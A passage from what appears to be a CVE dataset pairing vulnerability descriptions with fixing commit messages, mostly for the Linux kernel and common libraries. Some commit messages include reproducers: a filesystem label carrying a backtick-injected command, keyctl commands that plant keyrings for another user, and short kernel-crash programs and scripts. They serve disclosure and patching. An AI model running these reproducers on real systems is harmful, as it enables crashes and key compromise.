? fget_light+0x387/0x4f0  [<ffffffff816958a4>] udpv6_setsockopt+0x34/0x40  [<ffffffff815949f4>] sock_common_setsockopt+0x14/0x20  [<ffffffff81593c31>] SyS_setsockopt+0x71/0xd0  [<ffffffff816f5d54>] tracesys+0xdd/0xe2 Code: 00 00 48 89 44 24 10 8b 87 d8 00 00 00 48 89 44 24 08 48 8b 87 e8 00 00 00 48 c7 c7 c0 04 aa 81 48 89 04 24 31 c0 e8 e1 7e ff ff <0f> 0b 55 48 89 e5 0f 0b 55 48 89 e5 0f 0b 55 48 89 e5 0f 0b 55 RIP  [<ffffffff816e759c>] skb_panic+0x63/0x65  RSP <ffff8801e6431de8>  This patch adds a check if the pending data is of address family AF_INET and directly calls udp_push_ending_frames from udp_v6_push_pending_frames if that is the case.  This bug was found by Dave Jones with trinity.  (Also move the initialization of fl6 below the AF_INET check, even if not strictly necessary.)  Cc: Dave Jones <davej@redhat.com> Cc: YOSHIFUJI Hideaki <yoshfuji@linux-ipv6.org> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2014-9114,CWE-77,2017-03-31,Blkid in util-linux before 2.26rc-1 allows local users to execute arbitrary code.,"The high-level libblkid API uses /run/blkid/blkid.tab cache to store probing results. The cache format is     <device NAME=""value"" ...>devname</device>  and unfortunately the cache code does not escape quotation marks:     # mkfs.ext4 -L 'AAA""BBB'     # cat /run/blkid/blkid.tab    ...    <device ... LABEL=""AAA""BBB"" ...>/dev/sdb1</device>  such string is later incorrectly parsed and blkid(8) returns nonsenses. And for use-cases like     # eval $(blkid -o export /dev/sdb1)  it's also insecure.  Note that mount, udevd and blkid -p are based on low-level libblkid API, it bypass the cache and directly read data from the devices.  The current udevd upstream does not depend on blkid(8) output at all, it's directly linked with the library and all unsafe chars are encoded by \x<hex> notation.     # mkfs.ext4 -L 'X""`/tmp/foo` ""' /dev/sdb1    # udevadm info --export-db | grep LABEL    ...    E: ID_FS_LABEL=X__/tmp/foo___    E: ID_FS_LABEL_ENC=X\x22\x60\x2ftmp\x2ffoo\x60\x20\x22  Signed-off-by: Karel Zak <kzak@redhat.com>"
CVE-2015-9016,CWE-264,2018-04-05,"In blk_mq_tag_to_rq in blk-mq.c in the upstream kernel, there is a possible use after free due to a race condition when a request has been previously freed by blk_mq_complete_request. This could lead to local escalation of privilege. Product: Android. Versions: Android kernel. Android ID: A-63083046.","Inside timeout handler, blk_mq_tag_to_rq() is called to retrieve the request from one tag. This way is obviously wrong because the request can be freed any time and some fiedds of the request can't be trusted, then kernel oops might be triggered[1].  Currently wrt. blk_mq_tag_to_rq(), the only special case is that the flush request can share same tag with the request cloned from, and the two requests can't be active at the same time, so this patch fixes the above issue by updating tags->rqs[tag] with the active request(either flush rq or the request cloned from) of the tag.  Also blk_mq_tag_to_rq() gets much simplified with this patch.  Given blk_mq_tag_to_rq() is mainly for drivers and the caller must make sure the request can't be freed, so in bt_for_each() this helper is replaced with tags->rqs[tag].  [1] kernel oops log [  439.696220] BUG: unable to handle kernel NULL pointer dereference at 0000000000000158^M [  439.697162] IP: [<ffffffff812d89ba>] blk_mq_tag_to_rq+0x21/0x6e^M [  439.700653] PGD 7ef765067 PUD 7ef764067 PMD 0 ^M [  439.700653] Oops: 0000 [#1] PREEMPT SMP DEBUG_PAGEALLOC ^M [  439.700653] Dumping ftrace buffer:^M [  439.700653]    (ftrace buffer empty)^M [  439.700653] Modules linked in: nbd ipv6 kvm_intel kvm serio_raw^M [  439.700653] CPU: 6 PID: 2779 Comm: stress-ng-sigfd Not tainted 4.2.0-rc5-next-20150805+ #265^M [  439.730500] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011^M [  439.730500] task: ffff880605308000 ti: ffff88060530c000 task.ti: ffff88060530c000^M [  439.730500] RIP: 0010:[<ffffffff812d89ba>]  [<ffffffff812d89ba>] blk_mq_tag_to_rq+0x21/0x6e^M [  439.730500] RSP: 0018:ffff880819203da0  EFLAGS: 00010283^M [  439.730500] RAX: ffff880811b0e000 RBX: ffff8800bb465f00 RCX: 0000000000000002^M [  439.730500] RDX: 0000000000000000 RSI: 0000000000000202 RDI: 0000000000000000^M [  439.730500] RBP: ffff880819203db0 R08: 0000000000000002 R09: 0000000000000000^M [  439.730500] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000202^M [  439.730500] R13: ffff880814104800 R14: 0000000000000002 R15: ffff880811a2ea00^M [  439.730500] FS:  00007f165b3f5740(0000) GS:ffff880819200000(0000) knlGS:0000000000000000^M [  439.730500] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b^M [  439.730500] CR2: 0000000000000158 CR3: 00000007ef766000 CR4: 00000000000006e0^M [  439.730500] Stack:^M [  439.730500]  0000000000000008 ffff8808114eed90 ffff880819203e00 ffffffff812dc104^M [  439.755663]  ffff880819203e40 ffffffff812d9f5e 0000020000000000 ffff8808114eed80^M [  439.755663] Call Trace:^M [  439.755663]  <IRQ> ^M [  439.755663]  [<ffffffff812dc104>] bt_for_each+0x6e/0xc8^M [  439.755663]  [<ffffffff812d9f5e>] ? blk_mq_rq_timed_out+0x6a/0x6a^M [  439.755663]  [<ffffffff812d9f5e>] ? blk_mq_rq_timed_out+0x6a/0x6a^M [  439.755663]  [<ffffffff812dc1b3>] blk_mq_tag_busy_iter+0x55/0x5e^M [  439.755663]  [<ffffffff812d88b4>] ? blk_mq_bio_to_request+0x38/0x38^M [  439.755663]  [<ffffffff812d8911>] blk_mq_rq_timer+0x5d/0xd4^M [  439.755663]  [<ffffffff810a3e10>] call_timer_fn+0xf7/0x284^M [  439.755663]  [<ffffffff810a3d1e>] ? call_timer_fn+0x5/0x284^M [  439.755663]  [<ffffffff812d88b4>] ? blk_mq_bio_to_request+0x38/0x38^M [  439.755663]  [<ffffffff810a46d6>] run_timer_softirq+0x1ce/0x1f8^M [  439.755663]  [<ffffffff8104c367>] __do_softirq+0x181/0x3a4^M [  439.755663]  [<ffffffff8104c76e>] irq_exit+0x40/0x94^M [  439.755663]  [<ffffffff81031482>] smp_apic_timer_interrupt+0x33/0x3e^M [  439.755663]  [<ffffffff815559a4>] apic_timer_interrupt+0x84/0x90^M [  439.755663]  <EOI> ^M [  439.755663]  [<ffffffff81554350>] ? _raw_spin_unlock_irq+0x32/0x4a^M [  439.755663]  [<ffffffff8106a98b>] finish_task_switch+0xe0/0x163^M [  439.755663]  [<ffffffff8106a94d>] ? finish_task_switch+0xa2/0x163^M [  439.755663]  [<ffffffff81550066>] __schedule+0x469/0x6cd^M [  439.755663]  [<ffffffff8155039b>] schedule+0x82/0x9a^M [  439.789267]  [<ffffffff8119b28b>] signalfd_read+0x186/0x49a^M [  439.790911]  [<ffffffff8106d86a>] ? wake_up_q+0x47/0x47^M [  439.790911]  [<ffffffff811618c2>] __vfs_read+0x28/0x9f^M [  439.790911]  [<ffffffff8117a289>] ? __fget_light+0x4d/0x74^M [  439.790911]  [<ffffffff811620a7>] vfs_read+0x7a/0xc6^M [  439.790911]  [<ffffffff8116292b>] SyS_read+0x49/0x7f^M [  439.790911]  [<ffffffff81554c17>] entry_SYSCALL_64_fastpath+0x12/0x6f^M [  439.790911] Code: 48 89 e5 e8 a9 b8 e7 ff 5d c3 0f 1f 44 00 00 55 89 f2 48 89 e5 41 54 41 89 f4 53 48 8b 47 60 48 8b 1c d0 48 8b 7b 30 48 8b 53 38 <48> 8b 87 58 01 00 00 48 85 c0 75 09 48 8b 97 88 0c 00 00 eb 10 ^M [  439.790911] RIP  [<ffffffff812d89ba>] blk_mq_tag_to_rq+0x21/0x6e^M [  439.790911]  RSP <ffff880819203da0>^M [  439.790911] CR2: 0000000000000158^M [  439.790911] ---[ end trace d40af58949325661 ]---^M  Cc: <stable@vger.kernel.org> Signed-off-by: Ming Lei <ming.lei@canonical.com> Signed-off-by: Jens Axboe <axboe@fb.com>"
CVE-2018-14351,CWE-20,2018-07-17,An issue was discovered in Mutt before 1.10.1 and NeoMutt before 2018-07-16. imap/command.c mishandles a long IMAP status mailbox literal count size.,
CVE-2017-5592,CWE-20,2017-02-09,"An incorrect implementation of ""XEP-0280: Message Carbons"" in multiple XMPP clients allows a remote attacker to impersonate any user, including contacts, in the vulnerable application's display. This allows for various kinds of social engineering attacks. This CVE is for profanity (0.4.7 - 0.5.0).",
CVE-2018-15473,CWE-362,2018-08-17,"OpenSSH through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an invalid authenticating user until after the packet containing the request has been fully parsed, related to auth2-gss.c, auth2-hostbased.c, and auth2-pubkey.c.",containing the request has been fully parsed. Reported by Dariusz Tytko and Michał Sajdak; ok deraadt
CVE-2016-7538,CWE-787,2017-04-20,coders/psd.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds write) via a crafted file.,
CVE-2016-5195,CWE-362,2016-11-10,"Race condition in mm/gup.c in the Linux kernel 2.x through 4.x before 4.8.3 allows local users to gain privileges by leveraging incorrect handling of a copy-on-write (COW) feature to write to a read-only memory mapping, as exploited in the wild in October 2016, aka ""Dirty COW.""","This is an ancient bug that was actually attempted to be fixed once (badly) by me eleven years ago in commit 4ceb5db (""Fix get_user_pages() race for write access"") but that was then undone due to problems on s390 by commit f33ea7f (""fix get_user_pages bug"").  In the meantime, the s390 situation has long been fixed, and we can now fix it by checking the pte_dirty() bit properly (and do it better).  The s390 dirty bit was implemented in abf09be (""s390/mm: implement software dirty bits"") which made it into v3.9.  Earlier kernels will have to look at the page state itself.  Also, the VM has become more scalable, and what used a purely theoretical race back then has become easier to trigger.  To fix it, we introduce a new internal FOLL_COW flag to mark the ""yes, we already did a COW"" rather than play racy games with FOLL_WRITE that is very fundamental, and then use the pte dirty flag to validate that the FOLL_COW flag is still valid.  Reported-and-tested-by: Phil ""not Paul"" Oester <kernel@linuxace.com> Acked-by: Hugh Dickins <hughd@google.com> Reviewed-by: Michal Hocko <mhocko@suse.com> Cc: Andy Lutomirski <luto@kernel.org> Cc: Kees Cook <keescook@chromium.org> Cc: Oleg Nesterov <oleg@redhat.com> Cc: Willy Tarreau <w@1wt.eu> Cc: Nick Piggin <npiggin@gmail.com> Cc: Greg Thelen <gthelen@google.com> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2016-7976,CWE-20,2017-08-07,The PS Interpreter in Ghostscript 9.18 and 9.20 allows remote attackers to execute arbitrary code via crafted userparams.,
CVE-2018-1000878,CWE-416,2018-12-20,libarchive version commit 416694915449219d505531b1096384f3237dd6cc onwards (release v3.1.0 onwards) contains a CWE-416: Use After Free vulnerability in RAR decoder - libarchive/archive_read_support_format_rar.c that can result in Crash/DoS - it is unknown if RCE is possible. This attack appear to be exploitable via the victim must open a specially crafted RAR archive.,
CVE-2014-3186,CWE-119,2014-09-28,"Buffer overflow in the picolcd_raw_event function in devices/hid/hid-picolcd_core.c in the PicoLCD HID device driver in the Linux kernel through 3.16.3, as used in Android on Nexus 7 devices, allows physically proximate attackers to cause a denial of service (system crash) or possibly execute arbitrary code via a crafted device that sends a large report.","The report passed to us from transport driver could potentially be arbitrarily large, therefore we better sanity-check it so that raw_data that we hold in picolcd_pending structure are always kept within proper bounds.  Cc: stable@vger.kernel.org Reported-by: Steven Vittitoe <scvitti@google.com> Signed-off-by: Jiri Kosina <jkosina@suse.cz>"
CVE-2015-3197,CWE-200,2016-02-15,"ssl/s2_srvr.c in OpenSSL 1.0.1 before 1.0.1r and 1.0.2 before 1.0.2f does not prevent use of disabled ciphers, which makes it easier for man-in-the-middle attackers to defeat cryptographic protection mechanisms by performing computations on SSLv2 traffic, related to the get_client_master_key and get_client_hello functions.",
CVE-2017-14954,CWE-200,2017-10-02,"The waitid implementation in kernel/exit.c in the Linux kernel through 4.13.4 accesses rusage data structures in unintended cases, which allows local users to obtain sensitive information, and bypass the KASLR protection mechanism, via a crafted system call.","kernel_waitid() can return a PID, an error or 0.  rusage is filled in the first case and waitid(2) rusage should've been copied out exactly in that case, *not* whenever kernel_waitid() has not returned an error.  Compat variant shares that braino; none of kernel_wait4() callers do, so the below ought to fix it.  Reported-and-tested-by: Alexander Potapenko <glider@google.com> Fixes: ce72a16 (""wait4(2)/waitid(2): separate copying rusage to userland"") Cc: stable@vger.kernel.org # v4.13 Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>"
CVE-2018-0429,CWE-119,2018-08-09,Stack-based buffer overflow in the Cisco Thor decoder before commit 18de8f9f0762c3a542b1122589edb8af859d9813 allows local users to cause a denial of service (segmentation fault) and execute arbitrary code via a crafted non-conformant Thor bitstream.,"Fixes CVE-2018-0429 A vulnerability in the Thor decoder (available at: https://github.com/cisco/thor) could allow an authenticated, local attacker to cause segmentation faults and stack overflows when using a non-conformant Thor bitstream as input. The vulnerability is due to lack of input validation when parsing the bitstream. A successful exploit could allow the attacker to cause a stack overflow and potentially inject and execute arbitrary code."
CVE-2016-10210,CWE-476,2017-04-03,libyara/lexer.l in YARA 3.5.0 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via a crafted rule that is mishandled in the yy_get_next_buffer function.,* Add test for issue #503  * re_lexer: Make reading escape sequences more robust  This commit fixes parsing incomplete escape sequences at the end of a regular expression and parsing things like \xxy (invalid hex digits) which before were silently turned into (char)255.  Close #503  * Update re_lexer.c
CVE-2012-2844,,2012-07-12,"The PDF functionality in Google Chrome before 20.0.1132.57 does not properly handle JavaScript code, which allows remote attackers to cause a denial of service (incorrect object access) or possibly have unspecified other impact via a crafted document.",
CVE-2018-19843,CWE-125,2018-12-04,"opmov in libr/asm/p/asm_x86_nz.c in radare2 before 3.1.0 allows attackers to cause a denial of service (buffer over-read) via crafted x86 assembly data, as demonstrated by rasm2.",
CVE-2017-18270,,2018-05-18,"In the Linux kernel before 4.13.5, a local user could create keyrings for other users via keyctl commands, setting unwanted defaults or causing a denial of service.","It was possible for an unprivileged user to create the user and user session keyrings for another user.  For example:      sudo -u '#3000' sh -c 'keyctl add keyring _uid.4000 """" @U                            keyctl add keyring _uid_ses.4000 """" @U                            sleep 15' &     sleep 1     sudo -u '#4000' keyctl describe @U     sudo -u '#4000' keyctl describe @us  This is problematic because these ""fake"" keyrings won't have the right permissions.  In particular, the user who created them first will own them and will have full access to them via the possessor permissions, which can be used to compromise the security of a user's keys:      -4: alswrv-----v------------  3000     0 keyring: _uid.4000     -5: alswrv-----v------------  3000     0 keyring: _uid_ses.4000  Fix it by marking user and user session keyrings with a flag KEY_FLAG_UID_KEYRING.  Then, when searching for a user or user session keyring by name, skip all keyrings that don't have the flag set.  Fixes: 69664cf (""keys: don't generate user and user session keyrings unless they're accessed"") Cc: <stable@vger.kernel.org>	[v2.6.26+] Signed-off-by: Eric Biggers <ebiggers@google.com> Signed-off-by: David Howells <dhowells@redhat.com>"
CVE-2016-10154,CWE-119,2017-02-06,"The smbhash function in fs/cifs/smbencrypt.c in the Linux kernel 4.9.x before 4.9.1 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a scatterlist.","smbencrypt() points a scatterlist to the stack, which is breaks if CONFIG_VMAP_STACK=y.  Fix it by switching to crypto_cipher_encrypt_one().  The new code should be considerably faster as an added benefit.  This code is nearly identical to some code that Eric Biggers suggested.  Cc: stable@vger.kernel.org # 4.9 only Reported-by: Eric Biggers <ebiggers3@gmail.com> Signed-off-by: Andy Lutomirski <luto@kernel.org> Acked-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Steve French <smfrench@gmail.com>"
CVE-2018-7186,CWE-787,2018-02-16,"Leptonica before 1.75.3 does not limit the number of characters in a %s format argument to fscanf or sscanf, which allows remote attackers to cause a denial of service (stack-based buffer overflow) or possibly have unspecified other impact via a long string, as demonstrated by the gplotRead and ptaReadStream functions.",* Fixed a debian security issue with fscanf() reading a string with   possible buffer overflow. * There were also a few similar situations with sscanf().
CVE-2015-8543,,2015-12-28,"The networking implementation in the Linux kernel through 4.3.3, as used in Android and other products, does not validate protocol identifiers for certain protocol families, which allows local users to cause a denial of service (NULL function pointer dereference and system crash) or possibly gain privileges by leveraging CLONE_NEWUSER support to execute a crafted SOCK_RAW application.","郭永刚 reported that one could simply crash the kernel as root by using a simple program:  	int socket_fd; 	struct sockaddr_in addr; 	addr.sin_port = 0; 	addr.sin_addr.s_addr = INADDR_ANY; 	addr.sin_family = 10;  	socket_fd = socket(10,3,0x40000000); 	connect(socket_fd , &addr,16);  AF_INET, AF_INET6 sockets actually only support 8-bit protocol identifiers. inet_sock's skc_protocol field thus is sized accordingly, thus larger protocol identifiers simply cut off the higher bits and store a zero in the protocol fields.  This could lead to e.g. NULL function pointer because as a result of the cut off inet_num is zero and we call down to inet_autobind, which is NULL for raw sockets.  kernel: Call Trace: kernel:  [<ffffffff816db90e>] ? inet_autobind+0x2e/0x70 kernel:  [<ffffffff816db9a4>] inet_dgram_connect+0x54/0x80 kernel:  [<ffffffff81645069>] SYSC_connect+0xd9/0x110 kernel:  [<ffffffff810ac51b>] ? ptrace_notify+0x5b/0x80 kernel:  [<ffffffff810236d8>] ? syscall_trace_enter_phase2+0x108/0x200 kernel:  [<ffffffff81645e0e>] SyS_connect+0xe/0x10 kernel:  [<ffffffff81779515>] tracesys_phase2+0x84/0x89  I found no particular commit which introduced this problem.  CVE: CVE-2015-8543 Cc: Cong Wang <cwang@twopensource.com> Reported-by: 郭永刚 <guoyonggang@360.cn> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2019-1010296,CWE-190,2019-07-15,Linaro/OP-TEE OP-TEE 3.3.0 and earlier is affected by: Buffer Overflow. The impact is: Code execution in context of TEE core (kernel). The component is: optee_os. The fixed version is: 3.4.0 and later.,"Without checking for overflow there is a risk of allocating a buffer with size smaller than anticipated and as a consequence of that it might lead to a heap based overflow with attacker controlled data written outside the boundaries of the buffer.  Fixes: OP-TEE-2018-0009: ""Integer overflow in crypto system calls""  Signed-off-by: Joakim Bech <joakim.bech@linaro.org> Tested-by: Joakim Bech <joakim.bech@linaro.org> (QEMU v7, v8) Reviewed-by: Jens Wiklander <jens.wiklander@linaro.org> Reported-by: Riscure <inforequest@riscure.com> Reported-by: Alyssa Milburn <a.a.milburn@vu.nl> Acked-by: Etienne Carriere <etienne.carriere@linaro.org>"
CVE-2016-10167,CWE-20,2017-03-15,The gdImageCreateFromGd2Ctx function in gd_gd2.c in the GD Graphics Library (aka libgd) before 2.2.4 allows remote attackers to cause a denial of service (application crash) via a crafted image file.,We must not pretend that there are image data if there are none. Instead we fail reading the image file gracefully.
CVE-2019-14495,CWE-787,2019-08-01,webadmin.c in 3proxy before 0.8.13 has an out-of-bounds write in the admin interface.,
CVE-2016-10197,CWE-125,2017-03-15,The search_make_new function in evdns.c in libevent before 2.1.6-beta allows attackers to cause a denial of service (out-of-bounds read) via an empty hostname.,"From #332:   Here follows a bug report by **Guido Vranken** via the _Tor bug bounty program_. Please credit Guido accordingly.    ## Bug report    The DNS code of Libevent contains this rather obvious OOB read:    ```c   static char *   search_make_new(const struct search_state *const state, int n, const char *const base_name) {       const size_t base_len = strlen(base_name);       const char need_to_append_dot = base_name[base_len - 1] == '.' ? 0 : 1;   ```    If the length of ```base_name``` is 0, then line 3125 reads 1 byte before the buffer. This will trigger a crash on ASAN-protected builds.    To reproduce:    Build libevent with ASAN:   ```   $ CFLAGS='-fomit-frame-pointer -fsanitize=address' ./configure && make -j4   ```   Put the attached ```resolv.conf``` and ```poc.c``` in the source directory and then do:    ```   $ gcc -fsanitize=address -fomit-frame-pointer poc.c .libs/libevent.a   $ ./a.out   =================================================================   ==22201== ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60060000efdf at pc 0x4429da bp 0x7ffe1ed47300 sp 0x7ffe1ed472f8   READ of size 1 at 0x60060000efdf thread T0   ```  P.S. we can add a check earlier, but since this is very uncommon, I didn't add it.  Fixes: #332"
CVE-2019-13311,CWE-401,2019-07-05,ImageMagick 7.0.8-50 Q16 has memory leaks at AcquireMagickMemory because of a wand/mogrify.c error.,
CVE-2016-10144,CWE-284,2017-03-24,coders/ipl.c in ImageMagick allows remote attackers to have unspecific impact by leveraging a missing malloc check.,
CVE-2016-2108,CWE-119,2016-05-05,"The ASN.1 implementation in OpenSSL before 1.0.1o and 1.0.2 before 1.0.2c allows remote attackers to execute arbitrary code or cause a denial of service (buffer underflow and memory corruption) via an ANY field in crafted serialized data, aka the ""negative zero"" issue.",
CVE-2016-10208,CWE-125,2017-02-06,"The ext4_fill_super function in fs/ext4/super.c in the Linux kernel through 4.9.8 does not properly validate meta block groups, which allows physically proximate attackers to cause a denial of service (out-of-bounds read and system crash) via a crafted ext4 image.","Ralf Spenneberg reported that he hit a kernel crash when mounting a modified ext4 image. And it turns out that kernel crashed when calculating fs overhead (ext4_calculate_overhead()), this is because the image has very large s_first_meta_bg (debug code shows it's 842150400), and ext4 overruns the memory in count_overhead() when setting bitmap buffer, which is PAGE_SIZE.  ext4_calculate_overhead():   buf = get_zeroed_page(GFP_NOFS);  <=== PAGE_SIZE buffer   blks = count_overhead(sb, i, buf);  count_overhead():   for (j = ext4_bg_num_gdb(sb, grp); j > 0; j--) { <=== j = 842150400           ext4_set_bit(EXT4_B2C(sbi, s++), buf);   <=== buffer overrun           count++;   }  This can be reproduced easily for me by this script:    #!/bin/bash   rm -f fs.img   mkdir -p /mnt/ext4   fallocate -l 16M fs.img   mke2fs -t ext4 -O bigalloc,meta_bg,^resize_inode -F fs.img   debugfs -w -R ""ssv first_meta_bg 842150400"" fs.img   mount -o loop fs.img /mnt/ext4  Fix it by validating s_first_meta_bg first at mount time, and refusing to mount if its value exceeds the largest possible meta_bg number.  Reported-by: Ralf Spenneberg <ralf@os-t.de> Signed-off-by: Eryu Guan <guaneryu@gmail.com> Signed-off-by: Theodore Ts'o <tytso@mit.edu> Reviewed-by: Andreas Dilger <adilger@dilger.ca>"
CVE-2013-7421,CWE-269,2015-03-02,"The Crypto API in the Linux kernel before 3.18.5 allows local users to load arbitrary kernel modules via a bind system call for an AF_ALG socket with a module name in the salg_name field, a different vulnerability than CVE-2014-9644.","This prefixes all crypto module loading with ""crypto-"" so we never run the risk of exposing module auto-loading to userspace via a crypto API, as demonstrated by Mathias Krause:  https://lkml.org/lkml/2013/3/4/70  Signed-off-by: Kees Cook <keescook@chromium.org> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>"
CVE-2018-14469,CWE-125,2019-10-03,The IKEv1 parser in tcpdump before 4.9.3 has a buffer over-read in print-isakmp.c:ikev1_n_print().,
CVE-2015-8952,CWE-19,2016-10-16,"The mbcache feature in the ext2 and ext4 filesystem implementations in the Linux kernel before 4.6 mishandles xattr block caching, which allows local users to cause a denial of service (soft lockup) via filesystem operations in environments that use many attributes, as demonstrated by Ceph and Samba.","Original mbcache was designed to have more features than what ext? filesystems ended up using. It supported entry being in more hashes, it had a home-grown rwlocking of each entry, and one cache could cache entries from multiple filesystems. This genericity also resulted in more complex locking, larger cache entries, and generally more code complexity.  This is reimplementation of the mbcache functionality to exactly fit the purpose ext? filesystems use it for. Cache entries are now considerably smaller (7 instead of 13 longs), the code is considerably smaller as well (414 vs 913 lines of code), and IMO also simpler. The new code is also much more lightweight.  I have measured the speed using artificial xattr-bench benchmark, which spawns P processes, each process sets xattr for F different files, and the value of xattr is randomly chosen from a pool of V values. Averages of runtimes for 5 runs for various combinations of parameters are below. The first value in each cell is old mbache, the second value is the new mbcache.  V=10 F\P	1		2		4		8		16		32		64 10	0.158,0.157	0.208,0.196	0.500,0.277	0.798,0.400	3.258,0.584	13.807,1.047	61.339,2.803 100	0.172,0.167	0.279,0.222	0.520,0.275	0.825,0.341	2.981,0.505	12.022,1.202	44.641,2.943 1000	0.185,0.174	0.297,0.239	0.445,0.283	0.767,0.340	2.329,0.480	6.342,1.198	16.440,3.888  V=100 F\P	1		2		4		8		16		32		64 10	0.162,0.153	0.200,0.186	0.362,0.257	0.671,0.496	1.433,0.943	3.801,1.345	7.938,2.501 100	0.153,0.160	0.221,0.199	0.404,0.264	0.945,0.379	1.556,0.485	3.761,1.156	7.901,2.484 1000	0.215,0.191	0.303,0.246	0.471,0.288	0.960,0.347	1.647,0.479	3.916,1.176	8.058,3.160  V=1000 F\P	1		2		4		8		16		32		64 10	0.151,0.129	0.210,0.163	0.326,0.245	0.685,0.521	1.284,0.859	3.087,2.251	6.451,4.801 100	0.154,0.153	0.211,0.191	0.276,0.282	0.687,0.506	1.202,0.877	3.259,1.954	8.738,2.887 1000	0.145,0.179	0.202,0.222	0.449,0.319	0.899,0.333	1.577,0.524	4.221,1.240	9.782,3.579  V=10000 F\P	1		2		4		8		16		32		64 10	0.161,0.154	0.198,0.190	0.296,0.256	0.662,0.480	1.192,0.818	2.989,2.200	6.362,4.746 100	0.176,0.174	0.236,0.203	0.326,0.255	0.696,0.511	1.183,0.855	4.205,3.444	19.510,17.760 1000	0.199,0.183	0.240,0.227	1.159,1.014	2.286,2.154	6.023,6.039	---,10.933	---,36.620  V=100000 F\P	1		2		4		8		16		32		64 10	0.171,0.162	0.204,0.198	0.285,0.230	0.692,0.500	1.225,0.881	2.990,2.243	6.379,4.771 100	0.151,0.171	0.220,0.210	0.295,0.255	0.720,0.518	1.226,0.844	3.423,2.831	19.234,17.544 1000	0.192,0.189	0.249,0.225	1.162,1.043	2.257,2.093	5.853,4.997	---,10.399	---,32.198  We see that the new code is faster in pretty much all the cases and starting from 4 processes there are significant gains with the new code resulting in upto 20-times shorter runtimes. Also for large numbers of cached entries all values for the old code could not be measured as the kernel started hitting softlockups and died before the test completed.  Signed-off-by: Jan Kara <jack@suse.cz> Signed-off-by: Theodore Ts'o <tytso@mit.edu>"
CVE-2017-18218,CWE-416,2018-03-05,"In drivers/net/ethernet/hisilicon/hns/hns_enet.c in the Linux kernel before 4.13, local users can cause a denial of service (use-after-free and BUG) or possibly have unspecified other impact by leveraging differences in skb handling between hns_nic_net_xmit_hw and hns_nic_net_xmit.","skb maybe freed in hns_nic_net_xmit_hw() and return NETDEV_TX_OK, which cause hns_nic_net_xmit to use a freed skb.  BUG: KASAN: use-after-free in hns_nic_net_xmit_hw+0x62c/0x940... 	[17659.112635]      alloc_debug_processing+0x18c/0x1a0 	[17659.117208]      __slab_alloc+0x52c/0x560 	[17659.120909]      kmem_cache_alloc_node+0xac/0x2c0 	[17659.125309]      __alloc_skb+0x6c/0x260 	[17659.128837]      tcp_send_ack+0x8c/0x280 	[17659.132449]      __tcp_ack_snd_check+0x9c/0xf0 	[17659.136587]      tcp_rcv_established+0x5a4/0xa70 	[17659.140899]      tcp_v4_do_rcv+0x27c/0x620 	[17659.144687]      tcp_prequeue_process+0x108/0x170 	[17659.149085]      tcp_recvmsg+0x940/0x1020 	[17659.152787]      inet_recvmsg+0x124/0x180 	[17659.156488]      sock_recvmsg+0x64/0x80 	[17659.160012]      SyS_recvfrom+0xd8/0x180 	[17659.163626]      __sys_trace_return+0x0/0x4 	[17659.167506] INFO: Freed in kfree_skbmem+0xa0/0xb0 age=23 cpu=1 pid=13 	[17659.174000]      free_debug_processing+0x1d4/0x2c0 	[17659.178486]      __slab_free+0x240/0x390 	[17659.182100]      kmem_cache_free+0x24c/0x270 	[17659.186062]      kfree_skbmem+0xa0/0xb0 	[17659.189587]      __kfree_skb+0x28/0x40 	[17659.193025]      napi_gro_receive+0x168/0x1c0 	[17659.197074]      hns_nic_rx_up_pro+0x58/0x90 	[17659.201038]      hns_nic_rx_poll_one+0x518/0xbc0 	[17659.205352]      hns_nic_common_poll+0x94/0x140 	[17659.209576]      net_rx_action+0x458/0x5e0 	[17659.213363]      __do_softirq+0x1b8/0x480 	[17659.217062]      run_ksoftirqd+0x64/0x80 	[17659.220679]      smpboot_thread_fn+0x224/0x310 	[17659.224821]      kthread+0x150/0x170 	[17659.228084]      ret_from_fork+0x10/0x40  	BUG: KASAN: use-after-free in hns_nic_net_xmit+0x8c/0xc0... 	[17751.080490]      __slab_alloc+0x52c/0x560 	[17751.084188]      kmem_cache_alloc+0x244/0x280 	[17751.088238]      __build_skb+0x40/0x150 	[17751.091764]      build_skb+0x28/0x100 	[17751.095115]      __alloc_rx_skb+0x94/0x150 	[17751.098900]      __napi_alloc_skb+0x34/0x90 	[17751.102776]      hns_nic_rx_poll_one+0x180/0xbc0 	[17751.107097]      hns_nic_common_poll+0x94/0x140 	[17751.111333]      net_rx_action+0x458/0x5e0 	[17751.115123]      __do_softirq+0x1b8/0x480 	[17751.118823]      run_ksoftirqd+0x64/0x80 	[17751.122437]      smpboot_thread_fn+0x224/0x310 	[17751.126575]      kthread+0x150/0x170 	[17751.129838]      ret_from_fork+0x10/0x40 	[17751.133454] INFO: Freed in kfree_skbmem+0xa0/0xb0 age=19 cpu=7 pid=43 	[17751.139951]      free_debug_processing+0x1d4/0x2c0 	[17751.144436]      __slab_free+0x240/0x390 	[17751.148051]      kmem_cache_free+0x24c/0x270 	[17751.152014]      kfree_skbmem+0xa0/0xb0 	[17751.155543]      __kfree_skb+0x28/0x40 	[17751.159022]      napi_gro_receive+0x168/0x1c0 	[17751.163074]      hns_nic_rx_up_pro+0x58/0x90 	[17751.167041]      hns_nic_rx_poll_one+0x518/0xbc0 	[17751.171358]      hns_nic_common_poll+0x94/0x140 	[17751.175585]      net_rx_action+0x458/0x5e0 	[17751.179373]      __do_softirq+0x1b8/0x480 	[17751.183076]      run_ksoftirqd+0x64/0x80 	[17751.186691]      smpboot_thread_fn+0x224/0x310 	[17751.190826]      kthread+0x150/0x170 	[17751.194093]      ret_from_fork+0x10/0x40  Fixes: 